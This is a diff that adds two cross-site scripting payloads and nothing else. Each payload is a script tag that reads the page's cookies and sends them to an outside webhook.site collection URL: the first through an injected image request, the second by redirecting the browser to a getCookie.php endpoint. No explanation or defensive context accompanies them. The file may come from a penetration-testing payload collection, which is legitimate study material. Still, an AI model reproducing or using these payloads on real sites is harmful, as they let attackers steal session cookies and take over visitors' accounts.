@@ -1,0 +1,4 @@
+<script>document.write('<img src="https://webhook.site/11b2d3ab-6b5b-427b-b451-bca6c18ec85c?c='+document.cookie+'" />');</script>
+
+<script>document.location='https://webhook.site/11b2d3ab-6b5b-427b-b451-bca6c18ec85c/getCookie.php?cookie='+document.cookie;</script>
+
